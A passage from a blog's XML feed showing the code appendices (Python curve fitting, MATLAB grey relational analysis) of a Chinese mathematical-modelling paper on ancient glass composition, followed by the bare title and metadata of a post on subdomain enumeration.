punctuation">,</span><span class="token number">1.616</span><span class="token punctuation">,</span><span class="token number">0.248</span><span class="token punctuation">,</span><span class="token number">1.764</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.3675</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">62.095</span><span class="token punctuation">,</span><span class="token number">2.48</span><span class="token punctuation">,</span><span class="token number">13.525</span><span class="token punctuation">,</span><span class="token number">8.485</span><span class="token punctuation">,</span><span class="token number">0.52</span><span class="token punctuation">,</span><span class="token number">6.17</span><span class="token punctuation">,</span><span class="token number">1.65</span><span class="token punctuation">,</span><span class="token number">2.9</span><span class="token punctuation">,</span><span class="token number">0.11</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1.27</span><span class="token punctuation">,</span><span class="token number">0.04</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>y4<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">62.47</span><span class="token punctuation">,</span><span class="token number">3.38</span><span class="token punctuation">,</span><span class="token number">12.28</span><span class="token punctuation">,</span><span class="token number">8.23</span><span class="token punctuation">,</span><span class="token number">0.66</span><span class="token punctuation">,</span><span class="token number">9.23</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">0.47</span><span class="token punctuation">,</span><span class="token number">1.62</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.16</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>x<span class="token punctuation">,</span> str1<span class="token punctuation">,</span> rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y1<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y3<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y4<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录2-高钾玻璃各组成成分的拟合曲线python实现代码"><a href="#附录2-高钾玻璃各组成成分的拟合曲线python实现代码" class="headerlink" title="附录2 高钾玻璃各组成成分的拟合曲线python实现代码"></a>附录2 高钾玻璃各组成成分的拟合曲线python实现代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>linear_model <span class="token keyword">import</span> LinearRegressionplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment">#实例化线性模型****</span>lr <span class="token operator">=</span> LinearRegression<span class="token punctuation">(</span><span class="token punctuation">)</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">69.33</span><span class="token punctuation">,</span><span class="token number">87.05</span><span class="token punctuation">,</span><span class="token number">61.71</span><span class="token punctuation">,</span><span class="token number">65.88</span><span class="token punctuation">,</span><span class="token number">61.58</span><span class="token punctuation">,</span><span class="token number">67.65</span><span class="token punctuation">,</span><span class="token number">59.81</span><span class="token punctuation">,</span><span class="token number">92.63</span><span class="token punctuation">,</span><span class="token number">95.02</span><span class="token punctuation">,</span><span class="token number">96.77</span><span class="token punctuation">,</span><span class="token number">94.29</span><span class="token punctuation">,</span><span class="token number">92.35</span><span class="token punctuation">,</span><span class="token number">92.72</span><span class="token punctuation">,</span><span class="token number">59.01</span><span class="token punctuation">,</span><span class="token number">65.18</span><span class="token punctuation">,</span><span class="token number">62.47</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">9.99</span><span class="token punctuation">,</span><span class="token number">5.19</span><span class="token punctuation">,</span><span class="token number">12.37</span><span class="token punctuation">,</span><span class="token number">9.67</span><span class="token punctuation">,</span><span class="token number">10.95</span><span class="token punctuation">,</span><span class="token number">7.37</span><span class="token punctuation">,</span><span class="token number">7.68</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.59</span><span class="token punctuation">,</span><span class="token number">0.92</span><span class="token punctuation">,</span><span class="token number">1.01</span><span class="token punctuation">,</span><span class="token number">0.74</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12.53</span><span class="token punctuation">,</span><span class="token number">14.52</span><span class="token punctuation">,</span><span class="token number">12.28</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3.93</span><span class="token punctuation">,</span><span class="token number">4.06</span><span class="token punctuation">,</span><span class="token number">5.5</span><span class="token punctuation">,</span><span class="token number">6.44</span><span class="token punctuation">,</span><span class="token number">7.5</span><span class="token punctuation">,</span><span class="token number">11.15</span><span class="token punctuation">,</span><span class="token number">10.05</span><span class="token punctuation">,</span><span class="token number">1.98</span><span class="token punctuation">,</span><span class="token number">1.32</span><span class="token punctuation">,</span><span class="token number">0.81</span><span class="token punctuation">,</span><span class="token number">1.46</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">2.51</span><span class="token punctuation">,</span><span class="token number">6.16</span><span class="token punctuation">,</span><span class="token number">6.18</span><span class="token punctuation">,</span><span class="token number">9.23</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3.87</span><span class="token punctuation">,</span><span class="token number">0.78</span><span class="token punctuation">,</span><span class="token number">5.09</span><span class="token punctuation">,</span><span class="token number">2.18</span><span class="token punctuation">,</span><span class="token number">3.27</span><span class="token punctuation">,</span><span class="token number">2.51</span><span class="token punctuation">,</span><span class="token number">2.18</span><span class="token punctuation">,</span><span class="token number">1.56</span><span class="token punctuation">,</span><span class="token number">1.55</span><span class="token punctuation">,</span><span class="token number">0.84</span><span class="token punctuation">,</span><span class="token number">1.65</span><span class="token punctuation">,</span><span class="token number">0.55</span><span class="token punctuation">,</span><span class="token number">1.54</span><span class="token punctuation">,</span><span class="token number">4.73</span><span class="token punctuation">,</span><span class="token number">1.07</span><span class="token punctuation">,</span><span class="token number">0.47</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'二氧化铜含量'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'氧化铜含量'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'二氧化硅与氧化铜含量散点拟合曲线'</span><span class="token punctuation">)</span>mymodel <span class="token operator">=</span> numpy<span class="token punctuation">.</span>poly1d<span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>myline <span class="token operator">=</span> numpy<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token comment"># 原始散点图</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>myline<span class="token punctuation">,</span> mymodel<span class="token punctuation">(</span>myline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 多项式回归</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录3-对高钾玻璃、铅钡玻璃进行亚分类的划分结果"><a href="#附录3-对高钾玻璃、铅钡玻璃进行亚分类的划分结果" class="headerlink" title="附录3 对高钾玻璃、铅钡玻璃进行亚分类的划分结果"></a>附录3 对高钾玻璃、铅钡玻璃进行亚分类的划分结果</h4><p>高钾玻璃</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps170.jpg" alt="img"> </p><p>铅钡玻璃</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps171.jpg" alt="img"> </p><h4 id="附录4-灰色关联分析Matlab实现代码"><a href="#附录4-灰色关联分析Matlab实现代码" class="headerlink" title="附录4 灰色关联分析Matlab实现代码"></a>附录4 灰色关联分析Matlab实现代码</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.97731</span> <span class="token number">1.29178</span> <span class="token number">0.74085</span> <span class="token number">0.1866</span> <span class="token operator">-</span><span class="token number">0.60495</span> <span class="token operator">-</span><span class="token number">0.45975</span> <span class="token operator">-</span><span class="token number">0.96173</span> <span class="token operator">-</span><span class="token number">0.19092</span> <span class="token number">2.43346</span> <span class="token number">0.39734</span> <span class="token operator">-</span><span class="token number">0.49958</span> <span class="token number">0.05052</span> <span class="token operator">-</span><span class="token number">0.21996</span> <span class="token number">0.14428</span> <span class="token operator">-</span><span class="token number">0.1428</span> <span class="token operator">-</span><span class="token number">0.57176</span> <span class="token number">0.42721</span> <span class="token number">0.11773</span> <span class="token operator">-</span><span class="token number">1.71013</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">3.74896</span> <span class="token number">2.18943</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">1.11262</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">1.89238</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span><span class="token punctuation">;</span><span class="token number">0.26337</span> <span class="token operator">-</span><span class="token number">0.0789</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.85457</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.48118</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.48118</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.54342</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.01049</span> <span class="token operator">-</span><span class="token number">1.2482</span> <span class="token operator">-</span><span class="token number">1.06847</span> <span class="token operator">-</span><span class="token number">0.81916</span> <span class="token operator">-</span><span class="token number">0.37852</span> <span class="token number">1.41303</span> <span class="token number">1.57537</span> <span class="token number">2.24792</span> <span class="token number">0.17228</span> <span class="token number">1.19271</span> <span class="token number">0.3868</span> <span class="token number">0.61292</span> <span class="token number">1.51159</span> <span class="token operator">-</span><span class="token number">0.1466</span> <span class="token number">0.3868</span> <span class="token operator">-</span><span class="token number">1.46272</span> <span class="token operator">-</span><span class="token number">0.76118</span> <span class="token operator">-</span><span class="token number">0.7032</span> <span class="token number">0.56074</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token number">3.03422</span> <span class="token number">0.40871</span> <span class="token number">0.49432</span> <span class="token number">1.3362</span> <span class="token number">1.23631</span> <span class="token operator">-</span><span class="token number">0.19059</span> <span class="token number">0.83678</span> <span class="token number">1.20778</span> <span class="token operator">-</span><span class="token number">0.07644</span> <span class="token number">0.9652</span> <span class="token number">0.72263</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token number">0.26602</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.53585</span> <span class="token operator">-</span><span class="token number">0.54356</span> <span class="token operator">-</span><span class="token number">0.16943</span> <span class="token operator">-</span><span class="token number">0.96783</span> <span class="token operator">-</span><span class="token number">0.98711</span> <span class="token number">0.1237</span> <span class="token operator">-</span><span class="token number">0.29286</span> <span class="token number">0.15456</span> <span class="token number">4.10411</span> <span class="token number">0.91438</span> <span class="token operator">-</span><span class="token number">0.43942</span> <span class="token number">0.86424</span> <span class="token operator">-</span><span class="token number">0.19257</span> <span class="token operator">-</span><span class="token number">0.71327</span> <span class="token number">0.43997</span> <span class="token number">0.24712</span> <span class="token operator">-</span><span class="token number">0.44714</span> <span class="token operator">-</span><span class="token number">0.31985</span> <span class="token number">0.19698</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.18267</span> <span class="token operator">-</span><span class="token number">0.38351</span> <span class="token operator">-</span><span class="token number">0.42368</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.55758</span> <span class="token number">1.58475</span> <span class="token number">0.20563</span> <span class="token number">1.04917</span> <span class="token number">0.92866</span> <span class="token number">2.85676</span> <span class="token operator">-</span><span class="token number">0.37013</span> <span class="token number">0.78138</span> <span class="token operator">-</span><span class="token number">0.24962</span> <span class="token operator">-</span><span class="token number">0.50402</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token number">0.33952</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.21803</span> <span class="token operator">-</span><span class="token number">0.63577</span> <span class="token operator">-</span><span class="token number">0.6106</span> <span class="token operator">-</span><span class="token number">0.53511</span> <span class="token operator">-</span><span class="token number">0.97801</span> <span class="token operator">-</span><span class="token number">0.88238</span> <span class="token number">1.71462</span> <span class="token operator">-</span><span class="token number">0.21803</span> <span class="token operator">-</span><span class="token number">0.97801</span> <span class="token operator">-</span><span class="token number">0.6257</span> <span class="token operator">-</span><span class="token number">0.40929</span> <span class="token operator">-</span><span class="token number">0.2885</span> <span class="token operator">-</span><span class="token number">0.60054</span> <span class="token operator">-</span><span class="token number">0.6257</span> <span class="token operator">-</span><span class="token number">0.56027</span> <span class="token operator">-</span><span class="token number">0.30359</span> <span class="token operator">-</span><span class="token number">0.58041</span> <span class="token operator">-</span><span class="token number">0.39419</span> <span class="token number">0.5973</span><span class="token punctuation">;</span><span class="token number">0.54957</span> <span class="token number">0.22954</span> <span class="token number">0.72837</span> <span class="token number">1.50511</span> <span class="token operator">-</span><span class="token number">1.99899</span> <span class="token number">0.39214</span> <span class="token number">1.41118</span> <span class="token number">0.43296</span> <span class="token operator">-</span><span class="token number">1.44834</span> <span class="token operator">-</span><span class="token number">0.2518</span> <span class="token number">0.38437</span> <span class="token operator">-</span><span class="token number">2.19139</span> <span class="token number">0.85988</span> <span class="token number">0.60593</span> <span class="token number">1.12678</span> <span class="token number">1.32113</span> <span class="token number">0.20622</span> <span class="token number">0.45563</span> <span class="token number">0.08313</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.00644</span> <span class="token operator">-</span><span class="token number">0.92412</span> <span class="token operator">-</span><span class="token number">0.13464</span> <span class="token operator">-</span><span class="token number">0.38953</span> <span class="token operator">-</span><span class="token number">0.4421</span> <span class="token operator">-</span><span class="token number">0.13761</span> <span class="token operator">-</span><span class="token number">0.38259</span> <span class="token operator">-</span><span class="token number">0.78229</span> <span class="token operator">-</span><span class="token number">0.38061</span> <span class="token operator">-</span><span class="token number">0.50061</span> <span class="token number">0.30275</span> <span class="token operator">-</span><span class="token number">0.21894</span> <span class="token operator">-</span><span class="token number">1.10562</span> <span class="token operator">-</span><span class="token number">0.2487</span> <span class="token operator">-</span><span class="token number">0.37168</span> <span class="token operator">-</span><span class="token number">1.10562</span> <span class="token number">0.42672</span> <span class="token number">0.61021</span> <span class="token operator">-</span><span class="token number">0.34589</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.16317</span> <span class="token operator">-</span><span class="token number">1.07604</span> <span class="token operator">-</span><span class="token number">1.12929</span> <span class="token operator">-</span><span class="token number">0.96471</span> <span class="token operator">-</span><span class="token number">0.81708</span> <span class="token number">0.56002</span> <span class="token operator">-</span><span class="token number">1.24546</span> <span class="token number">1.85967</span> <span class="token operator">-</span><span class="token number">0.97923</span> <span class="token number">1.44097</span> <span class="token number">0.28896</span> <span class="token number">0.71491</span> <span class="token number">0.87223</span> <span class="token number">0.13648</span> <span class="token operator">-</span><span class="token number">0.21929</span> <span class="token number">2.1743</span> <span class="token operator">-</span><span class="token number">0.63072</span> <span class="token operator">-</span><span class="token number">1.24546</span> <span class="token number">0.93031</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.70924</span> <span class="token operator">-</span><span class="token number">0.70924</span> <span class="token operator">-</span><span class="token number">0.03905</span> <span class="token number">0.66641</span> <span class="token number">0.91332</span> <span class="token number">0.17259</span> <span class="token number">0.77223</span> <span class="token number">0.17259</span> <span class="token operator">-</span><span class="token number">0.60342</span> <span class="token number">0.13731</span> <span class="token number">0.84278</span> <span class="token operator">-</span><span class="token number">0.1096</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token number">0.06677</span> <span class="token number">1.61879</span> <span class="token number">2.46535</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token operator">-</span><span class="token number">0.6387</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token number">4.79574</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token number">1.56377</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token comment">%原始数据14行19列</span>x<span class="token operator">=</span>x1<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">x1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span>x1<span class="token operator">=</span>x<span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">x1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span>max<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>min<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token keyword">if</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">>=</span>max      max<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token keyword">if</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>min      min<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span>k<span class="token operator">=</span><span class="token number">0.5</span> <span class="token comment">%分辨系数取值</span>l<span class="token operator">=</span><span class="token punctuation">(</span>min<span class="token operator">+</span>k<span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token operator">./</span><span class="token punctuation">(</span>x<span class="token operator">+</span>k<span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token comment">%求关联系数矩阵</span>guanlianxing<span class="token operator">=</span><span class="token function">sum</span><span class="token punctuation">(</span>l<span class="token operator">'</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">[</span>rs<span class="token punctuation">,</span>rind<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">sort</span><span class="token punctuation">(</span>guanlianxing<span class="token punctuation">,</span><span class="token string">'descend'</span><span class="token punctuation">)</span> <span class="token comment">%对关联度进行排序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录5-表单2数据规律统计表"><a href="#附录5-表单2数据规律统计表" class="headerlink" title="附录5 表单2数据规律统计表"></a>附录5 表单2数据规律统计表</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;古代玻璃制品的成分分析与鉴别&quot;&gt;&lt;a href=&quot;#古代玻璃制品的成分分析与鉴别&quot; class=&quot;headerlink&quot; title=&quot;古代玻璃制品的成分分析与鉴别&quot;&gt;&lt;/a&gt;古代玻璃制品的成分分析与鉴别&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;摘要&quot;&gt;</summary>
      
    
    
    
    <category term="数学建模" scheme="https://shierjinghuang.github.io/categories/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
    
    <category term="数学建模" scheme="https://shierjinghuang.github.io/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>子域名深度挖掘</title>
    <link href="https://shierjinghuang.github.io/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/"/>
    <id>https://shierjinghuang.github.io/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/</id>
    <published>2022-10-30T01:02:28.000Z</published>
    <updated>2025-03-27T07:36:14.213Z</updated>
    
